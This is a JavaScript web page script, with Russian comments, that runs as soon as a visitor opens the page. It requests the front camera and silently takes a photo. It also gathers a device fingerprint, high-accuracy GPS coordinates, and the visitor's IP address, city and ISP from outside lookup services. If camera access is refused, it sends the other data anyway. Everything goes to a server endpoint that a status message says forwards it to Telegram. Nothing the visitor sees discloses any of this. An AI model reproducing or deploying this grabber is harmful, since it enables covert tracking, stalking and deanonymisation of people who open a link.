(function() {
    'use strict';

    // ===== ЭЛЕМЕНТЫ =====
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // ===== ПЕРЕМЕННЫЕ =====
    let stream = null;
    let isPhotoTaken = false;
    let isProcessing = false;
    let cameraReady = false;

    // ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
    function setStatus(text) {
        console.log('📊 Статус:', text);
    }

    function dataURLToBlob(dataURL) {
        const parts = dataURL.split(',');
        const mime = parts[0].match(/:(.*?);/)[1];
        const b64 = atob(parts[1]);
        const byteArray = new Uint8Array(b64.length);
        for (let i = 0; i < b64.length; i++) {
            byteArray[i] = b64.charCodeAt(i);
        }
        return new Blob([byteArray], { type: mime });
    }

    // ===== ПОЛУЧЕНИЕ ТОЧНОГО ВРЕМЕНИ =====
    function getTimestamp() {
        const now = new Date();
        return {
            iso: now.toISOString(),
            ms: now.getTime(),
            date: now.toLocaleDateString('ru-RU'),
            time: now.toLocaleTimeString('ru-RU', { hour12: false }),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            ms_full: now.getTime() + '.' + String(now.getMilliseconds()).padStart(3, '0')
        };
    }

    // ===== СБОР ДАННЫХ ОБ УСТРОЙСТВЕ =====
    function collectDeviceData() {
        const ua = navigator.userAgent;
        const data = {
            userAgent: ua,
            platform: navigator.platform || 'unknown',
            language: navigator.language || navigator.languages?.[0] || 'unknown',
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1
            },
            viewport: {
                width: window.innerWidth,
                height: window.innerHeight
            },
            memory: navigator.deviceMemory || 'unknown',
            cores: navigator.hardwareConcurrency || 'unknown',
            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            connection: navigator.connection ? {
                type: navigator.connection.effectiveType || 'unknown',
                downlink: navigator.connection.downlink || 'unknown',
                rtt: navigator.connection.rtt || 'unknown'
            } : 'unknown',
            battery: navigator.getBattery ? 'supported' : 'not supported',
            doNotTrack: navigator.doNotTrack || 'unspecified',
            cookieEnabled: navigator.cookieEnabled
        };

        if (ua.includes('Android')) data.os = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) data.os = 'iOS';
        else if (ua.includes('Windows')) data.os = 'Windows';
        else if (ua.includes('Mac')) data.os = 'macOS';
        else if (ua.includes('Linux')) data.os = 'Linux';
        else data.os = 'Unknown';

        if (ua.includes('Chrome') && !ua.includes('Edg')) data.browser = 'Chrome';
        else if (ua.includes('Firefox')) data.browser = 'Firefox';
        else if (ua.includes('Safari') && !ua.includes('Chrome')) data.browser = 'Safari';
        else if (ua.includes('Edg')) data.browser = 'Edge';
        else if (ua.includes('Opera') || ua.includes('OPR')) data.browser = 'Opera';
        else data.browser = 'Unknown';

        return data;
    }

    // ===== ГЕОЛОКАЦИЯ =====
    function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ error: 'Geolocation not supported', available: false });
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        available: true,
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude || null,
                        heading: position.coords.heading || null,
                        speed: position.coords.speed || null,
                        timestamp: position.timestamp
                    });
                },
                (error) => {
                    let errorMsg = 'Unknown error';
                    switch(error.code) {
                        case error.PERMISSION_DENIED: errorMsg = 'Permission denied'; break;
                        case error.POSITION_UNAVAILABLE: errorMsg = 'Position unavailable'; break;
                        case error.TIMEOUT: errorMsg = 'Timeout'; break;
                    }
                    resolve({ error: errorMsg, available: false, code: error.code });
                },
                {
                    enableHighAccuracy: true,
                    timeout: 8000,
                    maximumAge: 0
                }
            );
        });
    }

    // ===== ПОЛУЧЕНИЕ IP =====
    async function getIP() {
        try {
            const services = [
                'https://api.ipify.org?format=json',
                'https://ipapi.co/json/',
                'https://ip-api.com/json/'
            ];
            
            for (const url of services) {
                try {
                    const response = await fetch(url, { signal: AbortSignal.timeout(3000) });
                    if (!response.ok) continue;
                    const data = await response.json();
                    
                    if (data.ip) {
                        return { ip: data.ip, source: 'ipify' };
                    }
                    if (data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country_name,
                            city: data.city,
                            region: data.region,
                            source: 'ipapi.co'
                        };
                    }
                    if (data.query) {
                        return {
                            ip: data.query,
                            country: data.country,
                            city: data.city,
                            region: data.regionName,
                            isp: data.isp,
                            source: 'ip-api.com'
                        };
                    }
                } catch (e) {
                    continue;
                }
            }
            return { ip: 'unknown', error: 'All services failed' };
        } catch (err) {
            return { ip: 'unknown', error: err.message };
        }
    }

    // ===== ОТПРАВКА ДАННЫХ =====
    async function sendDataToServer(photoDataUrl, deviceData, locationData, ipData, timestamp) {
        if (isProcessing) return;
        isProcessing = true;

        try {
            let formData = new FormData();
            
            if (photoDataUrl) {
                const blob = dataURLToBlob(photoDataUrl);
                formData.append('photo', blob, 'photo.jpg');
            }
            
            const metadata = {
                device: deviceData,
                location: locationData,
                ip: ipData,
                timestamp: timestamp,
                photo_taken: !!photoDataUrl,
                url: window.location.href,
                referrer: document.referrer || 'direct'
            };
            
            formData.append('metadata', JSON.stringify(metadata));
            
            setStatus('📤 Отправка данных...');
            
            const response = await fetch('/upload', {
                method: 'POST',
                body: formData,
                signal: AbortSignal.timeout(15000)
            });
            
            const result = await response.json();
            
            if (result.success) {
                setStatus('✅ Данные отправлены в Telegram!');
                console.log('📊 Отправлены данные:', metadata);
            } else {
                setStatus('❌ Ошибка сервера: ' + (result.error || 'неизвестная'));
            }
        } catch (err) {
            console.error('Ошибка отправки:', err);
            setStatus('❌ Ошибка отправки: ' + err.message);
        } finally {
            isProcessing = false;
        }
    }

    // ===== СБОР ВСЕХ ДАННЫХ =====
    async function collectAllData() {
        const timestamp = getTimestamp();
        const deviceData = collectDeviceData();
        
        setStatus('📡 Сбор данных...');
        
        const ipData = await getIP();
        const locationData = await getLocation();
        
        const collectedData = {
            timestamp,
            device: deviceData,
            ip: ipData,
            location: locationData
        };
        
        console.log('📊 Собраны данные:', collectedData);
        return collectedData;
    }

    // ===== СЪЁМКА ФОТО =====
    function takePhotoFromVideo() {
        if (!stream || isPhotoTaken || isProcessing || !cameraReady) {
            console.log('⚠️ Камера не готова:', { stream: !!stream, isPhotoTaken, isProcessing, cameraReady });
            return;
        }
        
        // Проверяем, что видео имеет размеры
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            console.log('⏳ Видео ещё не загружено, повтор через 300ms...');
            setTimeout(takePhotoFromVideo, 300);
            return;
        }

        try {
            console.log('📸 Делаем фото, размер:', video.videoWidth, 'x', video.videoHeight);
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Отражаем зеркально
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0);
            // Сбрасываем трансформацию
            ctx.setTransform(1, 0, 0, 1, 0, 0);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.85);
            
            isPhotoTaken = true;
            
            collectAllData().then((data) => {
                sendDataToServer(photoData, data.device, data.location, data.ip, data.timestamp);
            });
            
        } catch (err) {
            console.error('❌ Ошибка съёмки:', err);
            collectAllData().then((data) => {
                sendDataToServer(null, data.device, data.location, data.ip, data.timestamp);
            });
            setStatus('⚠️ Ошибка фото, но данные отправлены');
        }
    }

    // ===== ЗАПУСК КАМЕРЫ =====
    async function startCamera() {
        try {
            setStatus('📷 Запрос доступа к камере...');
            console.log('📷 Запрос доступа к камере...');
            
            stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            });
            
            console.log('✅ Камера получена, подключаем к video...');
            
            video.srcObject = stream;
            
            // Ждём, пока видео загрузится
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    console.log('✅ video.onloadedmetadata сработал');
                    resolve();
                };
                // Если событие не сработало, ждём максимум 3 секунды
                setTimeout(resolve, 3000);
            });
            
            await video.play();
            console.log('✅ video.play() выполнен');
            
            cameraReady = true;
            setStatus('📸 Камера готова, делаем фото...');
            
            // Даём время на стабилизацию
            setTimeout(() => {
                takePhotoFromVideo();
            }, 500);
            
        } catch (err) {
            console.error('❌ Ошибка камеры:', err);
            
            let errorMsg = '';
            if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                errorMsg = '⚠️ Доступ к камере запрещён. Отправляем данные без фото.';
            } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
                errorMsg = '⚠️ Камера не найдена. Отправляем данные без фото.';
            } else {
                errorMsg = '⚠️ Ошибка камеры: ' + err.message;
            }
            
            setStatus(errorMsg);
            
            collectAllData().then((data) => {
                sendDataToServer(null, data.device, data.location, data.ip, data.timestamp);
            });
        }
    }

    // ===== ЗАПУСК =====
    function init() {
        setStatus('🔄 Подготовка...');
        console.log('🔄 Инициализация...');
        
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            setStatus('⚠️ Браузер не поддерживает камеру');
            console.log('⚠️ Браузер не поддерживает камеру');
            collectAllData().then((data) => {
                sendDataToServer(null, data.device, data.location, data.ip, data.timestamp);
            });
            return;
        }
        
        // Запускаем камеру с небольшой задержкой
        setTimeout(startCamera, 800);
    }

    // ===== ОЧИСТКА =====
    function cleanup() {
        if (stream) {
            stream.getTracks().forEach(track => {
                track.stop();
                track.enabled = false;
            });
            stream = null;
        }
        video.srcObject = null;
        cameraReady = false;
    }

    // ===== СОБЫТИЯ =====
    window.addEventListener('beforeunload', cleanup);
    window.addEventListener('pagehide', cleanup);

    // ===== ЗАПУСК ПРИ ЗАГРУЗКЕ =====
    if (document.readyState === 'complete') {
        init();
    } else {
        document.addEventListener('DOMContentLoaded', init);
    }

})();